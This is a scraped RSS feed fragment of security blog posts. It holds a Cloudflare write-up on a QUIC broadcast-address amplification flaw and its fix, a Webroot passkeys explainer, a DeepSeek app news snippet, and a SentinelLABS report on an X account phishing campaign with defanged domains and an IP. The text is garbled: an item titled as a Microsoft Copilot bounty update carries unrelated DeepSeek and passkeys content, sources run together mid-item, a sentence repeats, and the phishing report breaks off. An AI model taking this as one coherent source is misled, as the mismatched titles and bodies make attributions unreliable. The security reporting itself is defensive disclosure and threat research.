        &lt;p&gt;To combat the risk posed by broadcast addresses, by default most routers reject packets originating from outside their IP subnet which are targeted at the broadcast address of networks for which they are locally connected. Broadcast packets are only allowed to be forwarded within the same IP subnet, preventing attacks from the Internet from targeting servers across the world.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5TU3GO26KOJgzLHcS9Uxiu/6cd334afc3925b1713b7e706decc7269/image1.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;The same techniques are not generally applied when a given router is not directly connected to a given subnet. So long as an address is not locally treated as a broadcast address, &lt;a href="https://www.cloudflare.com/learning/security/glossary/what-is-bgp/"&gt;&lt;u&gt;Border Gateway Protocol&lt;/u&gt;&lt;/a&gt; (BGP) or other routing protocols will continue to route traffic from external IPs toward the last IPv4 address in a subnet. Essentially, this means a “broadcast address” is only relevant within a local scope of routers and hosts connected together via Ethernet. To routers and hosts across the Internet, a broadcast IP address is routed in the same way as any other IP.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Binding IP address ranges to hosts&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#binding-ip-address-ranges-to-hosts"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Each Cloudflare server is expected to be capable of serving content from every website on the Cloudflare network. Because our network utilizes &lt;a href="https://www.cloudflare.com/learning/cdn/glossary/anycast-network/"&gt;&lt;u&gt;Anycast&lt;/u&gt;&lt;/a&gt; routing, each server necessarily needs to be listening on (and capable of returning traffic from) every Anycast IP address in use on our network.&lt;/p&gt;&lt;p&gt;To do so, we take advantage of the loopback interface on each server. Unlike a physical network interface, all IP addresses within a given IP address range are made available to the host (and will be processed locally by the kernel) when bound to the loopback interface.&lt;/p&gt;&lt;p&gt;The mechanism by which this works is straightforward. In a traditional routing environment, &lt;a href="https://en.wikipedia.org/wiki/Longest_prefix_match"&gt;&lt;u&gt;longest prefix matching&lt;/u&gt;&lt;/a&gt; is employed to select a route. Under longest prefix matching, routes towards more specific blocks of IP addresses (such as 192.0.2.96/29, a range of 8 addresses) will be selected over routes to less specific blocks of IP addresses (such as 192.0.2.0/24, a range of 256 addresses).&lt;/p&gt;&lt;p&gt;While Linux utilizes longest prefix matching, it consults an additional step — the Routing Policy Database (RPDB) — before immediately searching for a match. The RPDB contains a list of routing tables which can contain routing information and their individual priorities. The default RPDB looks like this:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;$ ip rule show
0:	from all lookup local
32766:	from all lookup main
32767:	from all lookup default&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;Linux will consult each routing table in ascending numerical order to try and find a matching route. Once one is found, the search is terminated and the route immediately used.&lt;/p&gt;&lt;p&gt;If you’ve previously worked with routing rules on Linux, you are likely familiar with the contents of the main table. Contrary to the existence of the table named “default”, “main” generally functions as the default lookup table. It is also the one which contains what we traditionally associate with route table information:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;$ ip route show table main
default via 192.0.2.1 dev eth0 onlink
192.0.2.0/24 dev eth0 proto kernel scope link src 192.0.2.2&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;This is, however, not the first routing table that will be consulted for a given lookup. Instead, that task falls to the local table:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;$ ip route show table local
local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1
local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1
broadcast 127.255.255.255 dev lo proto kernel scope link src 127.0.0.1
local 192.0.2.2 dev eth0 proto kernel scope host src 192.0.2.2
broadcast 192.0.2.255 dev eth0 proto kernel scope link src 192.0.2.2&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;Looking at the table, we see two new types of routes — local and broadcast. As their names would suggest, these routes dictate two distinctly different functions: routes that are handled locally and routes that will result in a packet being broadcast. Local routes provide the desired functionality — any prefix with a local route will have all IP addresses in the range processed by the kernel. Broadcast routes will result in a packet being broadcast to all IP addresses within the given range. Both types of routes are added automatically when an IP address is bound to an interface (and, when a range is bound to the loopback (lo) interface, the range itself will be added as a local route).&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Vulnerability discovery&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#vulnerability-discovery"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Deployments of QUIC are highly dependent on the load-balancing and packet forwarding infrastructure that they sit on top of. Although QUIC’s RFCs describe risks and mitigations, there can still be attack vectors depending on the nature of server deployments. The reporting researchers studied QUIC deployments across the Internet and discovered that sending a QUIC Initial packet to one of Cloudflare’s broadcast addresses triggered a flood of responses. The aggregate amount of response data exceeded the RFC's 3x amplification limit.&lt;/p&gt;&lt;p&gt;Taking a look at the local routing table of an example Cloudflare system, we see a potential culprit:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;$ ip route show table local
local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1
local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1
broadcast 127.255.255.255 dev lo proto kernel scope link src 127.0.0.1
local 192.0.2.2 dev eth0 proto kernel scope host src 192.0.2.2
broadcast 192.0.2.255 dev eth0 proto kernel scope link src 192.0.2.2
local 203.0.113.0 dev lo proto kernel scope host src 203.0.113.0
local 203.0.113.0/24 dev lo proto kernel scope host src 203.0.113.0
broadcast 203.0.113.255 dev lo proto kernel scope link src 203.0.113.0&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;On this example system, the anycast prefix 203.0.113.0/24 has been bound to the loopback interface (lo) through the use of standard tooling. Acting dutifully under the standards of IPv4, the tooling has assigned both special types of routes — a local one for the IP range itself and a broadcast one for the final address in the range — to the interface.&lt;/p&gt;&lt;p&gt;While traffic to the broadcast address of our router’s directly connected subnet is filtered as expected, broadcast traffic targeting our routed anycast prefixes still arrives at our servers themselves. Normally, broadcast traffic arriving at the loopback interface does little to cause problems. Services bound to a specific port across an entire range will receive data sent to the broadcast address and continue as normal. Unfortunately, this relatively simple trait breaks down when normal expectations are broken.&lt;/p&gt;&lt;p&gt;Cloudflare’s frontend consists of several worker processes, each of which independently binds to the entire anycast range on UDP port 443. In order to enable multiple processes to bind to the same port, we use the SO_REUSEPORT socket option. While SO_REUSEPORT &lt;a href="https://blog.cloudflare.com/the-sad-state-of-linux-socket-balancing/"&gt;&lt;u&gt;has additional benefits&lt;/u&gt;&lt;/a&gt;, it also causes traffic sent to the broadcast address to be copied to every listener.&lt;/p&gt;&lt;p&gt;Each individual QUIC server worker operates in isolation. Each one reacted to the same client Initial, duplicating the work on the server side and generating response traffic to the client's IP address. Thus, a single packet could trigger a significant amplification. While specifics will vary by implementation, a typical one-listener-per-core stack (which sends retries in response to presumed timeouts) on a 128-core system could result in 384 replies being generated and sent for each packet sent to the broadcast address.&lt;/p&gt;&lt;p&gt;Although the researchers demonstrated this attack on QUIC, the underlying vulnerability can affect other UDP request/response protocols that use sockets in the same way.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Mitigation&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#mitigation"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;As a communication methodology, broadcast is not generally desirable for anycast prefixes. Thus, the easiest method to mitigate the issue was simply to disable broadcast functionality for the final address in each range.&lt;/p&gt;&lt;p&gt;Ideally, this would be done by modifying our tooling to only add the local routes in the local routing table, skipping the inclusion of the broadcast ones altogether. Unfortunately, the only practical mechanism to do so would involve patching and maintaining our own internal fork of the iproute2 suite, a rather heavy-handed solution for the problem at hand.&lt;/p&gt;&lt;p&gt;Instead, we decided to focus on removing the route itself. Similar to any other route, it can be removed using standard tooling:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;$ sudo ip route del 203.0.113.255 table local&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;To do so at scale, we made a relatively minor change to our deployment system:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;  {%- for lo_route in lo_routes %}
    {%- if lo_route.type == "broadcast" %}
        # All broadcast addresses are implicitly ipv4
        {%- do remove_route({
        "dev": "lo",
        "dst": lo_route.dst,
        "type": "broadcast",
        "src": lo_route.src,
        }) %}
    {%- endif %}
  {%- endfor %}&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;In doing so, we effectively ensure that all broadcast routes attached to the loopback interface are removed, mitigating the risk by ensuring that the specification-defined broadcast address is treated no differently than any other address in the range.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Next steps &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#next-steps"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;While the vulnerability specifically affected broadcast addresses within our anycast range, it likely expands past our infrastructure. Anyone with infrastructure that meets the relatively narrow criteria (a multi-worker, multi-listener UDP-based service that is bound to all IP addresses on a machine with routable IP prefixes attached in such a way as to expose the broadcast address) will be affected unless mitigations are in place. We encourage network administrators and security professionals to assess their systems for configurations that may present a local amplification attack vector.&lt;/p&gt;</content:encoded><guid isPermaLink="false">6ZaxgQxDACeIF6MZAquLPV</guid><category>Security</category><category>Network</category><category>Edge</category><category>DDoS</category><category>HTTP3</category><category>Bug Bounty</category></item><item><title>Exciting updates to the Copilot (AI) Bounty Program: Enhancing security and incentivizing innovation</title><link>https://msrc.microsoft.com/blog/2025/02/exciting-updates-to-the-copilot-ai-bounty-program-enhancing-security-and-incentivizing-innovation/</link><description>At Microsoft, we are committed to fostering a secure and innovative environment for our customers and users.

Within days, the DeepSeek AI assistant app climbed to the top of the iPhone App Store's "Free Apps" category, overtaking ChatGPT.&lt;/p&gt;
&lt;p&gt;On Thursday, mobile security company &lt;a href="https://www.nowsecure.com/blog/2025/02/06/nowsecure-uncovers-multiple-security-and-privacy-flaws-in-deepseek-ios-mobile-app/"&gt;NowSecure reported&lt;/a&gt; that the app sends sensitive data over unencrypted channels, making the data readable to anyone who can monitor the traffic. More sophisticated attackers could also tamper with the data while it's in transit. Apple strongly encourages iPhone and iPad developers to enforce encryption of data sent over the wire using ATS (&lt;a href="https://developer.apple.com/documentation/security/preventing-insecure-network-connections"&gt;App Transport Security&lt;/a&gt;). For unknown reasons, that protection is globally disabled in the app, NowSecure said.&lt;/p&gt;
&lt;h2&gt;Basic security protections MIA&lt;/h2&gt;
&lt;p&gt;What’s more, the data is sent to servers that are controlled by ByteDance, the Chinese company that owns TikTok. While some of that data is properly encrypted using transport layer security, once it's decrypted on the ByteDance-controlled servers, it can be cross-referenced with user data collected elsewhere to identify specific users and potentially track queries and other usage.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/02/deepseek-ios-app-sends-data-unencrypted-to-bytedance-controlled-servers/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/02/05/passkeys-the-future-of-secure-and-seamless-authentication/" rel="nofollow"&gt;Passkeys: The future of secure and seamless authentication&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;What are passkeys?&lt;/h2&gt;



&lt;p&gt;You may have seen the term &amp;#8220;passkeys&amp;#8221; appearing more frequently in tech news, app updates, and security discussions. Major companies like Apple, Google, and Microsoft are rolling out passkeys as a replacement for passwords, promising both enhanced security and a smoother user experience. But what exactly are passkeys, and why are they considered the future of authentication?&lt;/p&gt;



&lt;p&gt;With Password Day coming up this Saturday, it&amp;#8217;s the perfect time to discuss the future of authentication. Passwords have long been the foundation of online security, but they come with significant downsides: they can be stolen, guessed, or reused across multiple sites. Enter passkeys, a next-generation authentication technology designed to replace passwords entirely with a more secure and user-friendly alternative.&lt;/p&gt;



&lt;p&gt;Passkeys leverage public-key cryptography to authenticate users without requiring them to remember or type in a password. Instead, passkeys are stored on a trusted device (like your phone, laptop, or tablet) and are accessed using biometrics (Face ID, fingerprint), a PIN, or other device authentication methods. This means&amp;nbsp;&lt;strong&gt;no more passwords to remember, reset, or leak in data breaches&lt;/strong&gt;.&lt;/p&gt;



&lt;p class="has-text-align-center"&gt;&lt;strong&gt;&lt;a href="https://www.brighttalk.com/webcast/18665/620476" rel="noreferrer noopener" target="_blank"&gt;Check out our recent webinar where we discuss passkeys&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;How do passkeys work?&lt;/h2&gt;



&lt;p&gt;Passkeys function using a public and private&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;key pair:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;The public key&lt;/strong&gt; is stored on the website or service you’re signing into.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;The private key&lt;/strong&gt; stays securely on your device and is never shared.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;When you log in, the website asks your device to prove that it holds the correct private key. Your device then uses biometric authentication (like Face ID or a fingerprint) to confirm your identity, and the cryptographic exchange verifies you without transmitting a password over the internet. This makes passkeys resistant to &lt;strong&gt;phishing, credential stuffing, and brute-force attacks.&lt;/strong&gt;&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2025/02/05130002/passkey2.jpg"&gt;&lt;img alt="Color illustration of a latch key." class="wp-image-33673" height="504" src="https://blog-en.webroot.com/wp-content/uploads/2025/02/05130002/passkey2.jpg" width="940" /&gt;&lt;/a&gt;&lt;/figure&gt;

&lt;h2 class="wp-block-heading"&gt;Pros of passkeys&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;1. Enhanced security&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;No passwords mean no risk of phishing attacks, password leaks, or brute-force attacks.&lt;/li&gt;



&lt;li&gt;Passkeys are unique for every website, preventing credential reuse across multiple accounts.&lt;/li&gt;



&lt;li&gt;Resistant to man-in-the-middle (MitM) attacks because private keys are never shared.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;2. Seamless user experience&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;No need to remember or type passwords—simply authenticate with Face ID, a fingerprint, or a PIN.&lt;/li&gt;



&lt;li&gt;Logging in is faster and easier, especially on mobile devices.&lt;/li&gt;



&lt;li&gt;Syncs automatically across devices when backed up in Apple iCloud Keychain, Google Password Manager, or Microsoft Account.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;3. Built-in multifactor authentication (MFA)&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Traditional MFA often requires entering a one-time passcode (OTP), which can be intercepted.&lt;/li&gt;



&lt;li&gt;Passkeys combine possession (your device) and biometric authentication, making them more secure than passwords + SMS codes.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;4. No centralized password database to hack&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Unlike traditional login systems that store passwords in a database (which hackers can breach), passkeys store only public keys on websites, reducing the risk of massive data breaches.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;5. Reduced risk of social engineering&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Attackers can’t trick users into revealing passkeys like they do with passwords.&lt;/li&gt;



&lt;li&gt;Since passkeys are bound to specific websites, even if a hacker creates a fake login page, they won’t be able to use the stolen passkey elsewhere.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;Cons of passkeys&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;1. Device dependency&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Passkeys are tied to your device, meaning if you lose access to your phone or laptop, you could have trouble logging in.&lt;/li&gt;



&lt;li&gt;Solution: Enable cloud backups through iCloud Keychain (Apple), Google Password Manager (Android/Chrome), or Microsoft Account.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;2. Not all websites support passkeys yet&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;While adoption is growing, not every website or service currently supports passkeys.&lt;/li&gt;



&lt;li&gt;Workaround: You may still need to use passwords for some sites while passkey adoption expands.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;3. Migration challenges&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Users switching between ecosystems (Apple to Android or vice versa) may need to manually transfer passkeys.&lt;/li&gt;



&lt;li&gt;Solution: Some platforms allow exporting and importing passkeys, but it&amp;#8217;s not always seamless.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;4. Learning curve for some users&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Users unfamiliar with biometrics, password managers, or cryptographic authentication might find passkeys confusing at first.&lt;/li&gt;



&lt;li&gt;Solution: Tech companies are working on better onboarding experiences to help ease the transition.Users unfamiliar with biometrics, password managers, or cryptographic authentication might find passkeys confusing at first.&lt;/li&gt;

&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2025/02/05132738/passkey3.jpg"&gt;&lt;img alt="" class="wp-image-33679" height="398" src="https://blog-en.webroot.com/wp-content/uploads/2025/02/05132738/passkey3.jpg" width="946" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;br /&gt;What happens if you lose your phone?&lt;/h2&gt;



&lt;p&gt;Losing your device when using passkeys can be a concern, but here’s how to handle it:&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;1. Use a backup device&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;If you’ve set up passkeys on multiple devices (e.g., phone, tablet, laptop), you can log in using another device.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;2. Restore from cloud backup&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Apple, Google, and Microsoft automatically sync passkeys across devices using their respective cloud services.&lt;/li&gt;



&lt;li&gt;When setting up a new phone, simply&lt;strong&gt; log into your cloud account&lt;/strong&gt; to restore access.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;3. Account recovery options&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Many services still offer fallback authentication methods, such as email recovery, SMS codes, or backup keys.&lt;/li&gt;



&lt;li&gt;Some sites allow you to generate a recovery passkey during setup—store this in a safe place!&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;4. Remote device management&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;If your phone is lost or stolen, use&amp;nbsp;&lt;strong&gt;Find My Device (Apple, Google)&lt;/strong&gt;&amp;nbsp;to remotely wipe or lock it to prevent unauthorized access.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Why you should consider switching to passkeys&lt;/h2&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Stronger security than passwords&lt;/strong&gt;—no phishing, leaks, or brute-force attacks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Faster logins&lt;/strong&gt;—just use your fingerprint or face instead of typing passwords.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;No password resets&lt;/strong&gt;—forget the frustration of forgetting your credentials.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Growing adoption&lt;/strong&gt;—major companies like Apple, Google, Microsoft, and banks are pushing for passkey implementation.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Passkeys represent a significant shift in authentication, making online accounts &lt;strong&gt;more secure and easier to use.&lt;/strong&gt; While challenges like device loss and adoption gaps still exist, the benefits far outweigh the drawbacks.&lt;/p&gt;



&lt;p&gt;If you haven’t tried passkeys yet, consider setting them up on a supported website. As more services move toward this passwordless future, early adopters will enjoy enhanced security and convenience while leaving the hassles of passwords behind.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;An active phishing campaign is targeting high-profile X accounts in an attempt to hijack and exploit them for fraudulent activity.&lt;/li&gt;
&lt;li&gt;This campaign has been observed targeting a variety of individual and organization accounts such as U.S. political figures, leading international journalists, an X employee, large technology organizations, cryptocurrency organizations, and owners of valuable, short usernames.&lt;/li&gt;
&lt;li&gt;SentinelLABS’ analysis links this activity to a similar operation from last year that successfully compromised multiple accounts to spread scam content with financial objectives. While the activity detailed here is centered around X/Twitter accounts, this actor is not limited to a single social platform, and can be observed directing attention to other popular services as well, while seemingly pursuing the same financial objectives.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you’ve encountered similar suspicious activity, SentinelLABS would love to hear from you — please reach out to the team at &lt;a href="mailto:ThreatTips@sentinelone.com" rel="noopener noreferrer" target="_blank"&gt;ThreatTips@sentinelone.com&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Account Compromise Process&lt;/h2&gt;
&lt;p&gt;Thanks to tips from targets and collaboration with industry partners, SentinelLABS has observed a variety of phishing lures tied to this campaign over the past few weeks. One example is the classic account login notice. The links in the email received by the target are not legitimate and lead to credential phishing sites. Other observed lures use copyright violation themes. However, SentinelLABS notes that directly phishing users may not be the only access method employed by this attacker.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113633" style="width: 760px;"&gt;&lt;img alt="" class="wp-image-113633 size-full" height="1320" src="https://www.sentinelone.com/wp-content/uploads/2025/01/new-login-phishing-email.jpg" width="760" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113633"&gt;An X ‘new login’-themed phishing email&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;In recent cases, we observed the actor abusing Google&amp;#8217;s &amp;#8220;AMP Cache&amp;#8221; domain &lt;code&gt;cdn.ampproject[.]org&lt;/code&gt; to evade email detections and redirect the user to a phishing domain:&lt;/p&gt;
&lt;pre&gt;https://cdn.ampproject[.]org/c/s/x-recoverysupport.com/reset/?username=[X-USERNAME]&lt;/pre&gt;
&lt;p&gt;This ultimately leads the targets to an actor-made phishing website seeking X account credentials:&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113632" style="width: 684px;"&gt;&lt;img alt="" class="wp-image-113632 size-full" height="792" src="https://www.sentinelone.com/wp-content/uploads/2025/01/x-creds-phishing-page.jpg" width="684" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113632"&gt;X credential phishing page&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;In the copyright infringement lure scenario, the user will first visit an Action Needed page before being prompted to enter credentials:&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113631" style="width: 1514px;"&gt;&lt;img alt="" class="size-full wp-image-113631" height="786" src="https://www.sentinelone.com/wp-content/uploads/2025/01/x-fake-copyright-infringement.jpg" width="1514" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113631"&gt;X fake copyright infringement page&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Once an account is taken over, the attacker swiftly locks out the legitimate owner and begins posting fraudulent cryptocurrency opportunities or links to external sites designed to lure additional targets, often with a crypto theft-related theme. Ultimately, compromising high-profile accounts enables the attacker to reach a broader audience of potential secondary victims, maximizing their financial gains.&lt;/p&gt;
&lt;h2&gt;Widespread Activity&lt;/h2&gt;
&lt;p&gt;In recent activity associated with this campaign, the domain &lt;code&gt;securelogins-x[.]com&lt;/code&gt; has been used to deliver emails and &lt;code&gt;x-recoverysupport[.]com&lt;/code&gt; to host phishing pages. Our observations indicate a level of informality and flexibility of infrastructure use – meaning any of these domains can be considered email delivery or phishing page hosting.&lt;/p&gt;
&lt;p&gt;An overall collection of recent activity can be observed hosted on &lt;code&gt;84.38.130[.]20&lt;/code&gt;, an IP associated with a Belize-based VPS service called Dataclub. The domains themselves have been predominantly registered through Turkish hosting provider Turkticaret.&lt;/p&gt;
&lt;p&gt;Inspecting the DNS history of &lt;code&gt;84.38.130[.]20&lt;/code&gt; leads to a variety of interestingly related domains. As shown below, the cluster of activity began in mid-2024 and continues today. While this is only one phishing page hosting IP, it provides a good perspective of the length of this activity and its ability to avoid much attention for over a year.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113630" style="width: 1558px;"&gt;&lt;img alt="" class="size-full wp-image-113630" height="886" src="https://www.sentinelone.com/wp-content/uploads/2025/01/validin-infrastructure-analysis.jpg" width="1558" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113630"&gt;Validin Infrastructure Analysis Timeline&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Our observations suggest that the attacker is highly adaptable, continuously exploring new techniques while maintaining a clear financial motive. The targeting appears constrained, yet opportunistic. Notably, past public reports have attributed related activity to Turkish-speaking actors based on language phishing page source comment language. At this time, we do not attribute this campaign to a specific country or any widely-tracked threat actor.&lt;/p&gt;
&lt;p&gt;Some of the malicious sites and content hosted across &lt;code&gt;84.38.130[.]20&lt;/code&gt; are built using the FASTPANEL DIRECT service.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113629" style="width: 1046px;"&gt;&lt;img alt="" class="size-full wp-image-113629" height="836" src="https://www.sentinelone.com/wp-content/uploads/2025/01/FASTPANEL-landing-page.jpg" width="1046" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113629"&gt;FASTPANEL landing page on buy-tanai[.]com&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;FASTPANEL is a website hosting and building service that specializes in rapid building and management of websites. While FASTPANEL is not a malicious service, it is frequently abused by bad actors due to the ease of use, rapid scalability, and relatively low cost. FASTPANEL is routinely utilized by drainer gains and phishing campaigns, and is also included in associated guides and tutorials distributed throughout cybercrime communication channels.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113628" style="width: 1556px;"&gt;&lt;img alt="" class="size-full wp-image-113628" height="664" src="https://www.sentinelone.com/wp-content/uploads/2025/01/example-discussion-FASTPANEL.jpg" width="1556" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113628"&gt;Example discussion of FASTPANEL (RU crime forum)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Of the sites hosted on &lt;code&gt;84.38.130[.]20&lt;/code&gt;, the &lt;code&gt;buy-tanai[.]com&lt;/code&gt; and &lt;code&gt;emotionai[.]live&lt;/code&gt; sites still present the FASTPANEL landing pages as of this writing.&lt;/p&gt;
&lt;h2&gt;Publicly Linkable Activity&lt;/h2&gt;
&lt;h3&gt;Emerging Account Intrusions&lt;/h3&gt;
&lt;p&gt;While we have not yet established a high-confidence link, a recent compromise of a Tor Project account closely mirrors our observations. On January 30, 2025, the official X account for the Tor Project was breached. While it is possible that the same threat actor is responsible, we lack sufficient evidence to confirm the connection as of this writing.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113627" style="width: 1534px;"&gt;&lt;img alt="" class="size-full wp-image-113627" height="1018" src="https://www.sentinelone.com/wp-content/uploads/2025/01/x-tor-project-potential-comp.jpg" width="1534" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113627"&gt;X post from The Tor Project account on January 30, 2025 advising users of a potential compromise&lt;/figcaption&gt;&lt;/figure&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113626" style="width: 1522px;"&gt;&lt;img alt="" class="wp-image-113626 size-full" height="762" src="https://www.sentinelone.com/wp-content/uploads/2025/01/tor-project-account-comp-notice.jpg" width="1522" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113626"&gt;Tor Project account compromise notice&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The Decentralized Autonomous Wireless Network (DAWN) was another victim of this type of attack. The threat actor &lt;a href="https://coinpedia.org/news/dawn-internets-x-account-hacked-phishing-scams-target-users-via-telegram/" rel="noopener noreferrer" target="_blank"&gt;leveraged&lt;/a&gt; the compromised DAWN-related social media accounts to lure victims into entering credentials into phishing pages targeting X and Telegram credentials.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113625" style="width: 1354px;"&gt;&lt;img alt="" class="size-full wp-image-113625" height="1358" src="https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post.jpg" width="1354" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113625"&gt;DAWN X Posts&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The compromise of DAWN’s X accounts goes back to mid-January 2025.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113624" style="width: 960px;"&gt;&lt;img alt="" class="size-full wp-image-113624" height="1106" src="https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-rewards-comp-post.jpg" width="960" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113624"&gt;January 14, 2025 &amp;#8211; DAWN rewards compromise post&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h3&gt;Crypto-Themed Project Placeholders&lt;/h3&gt;
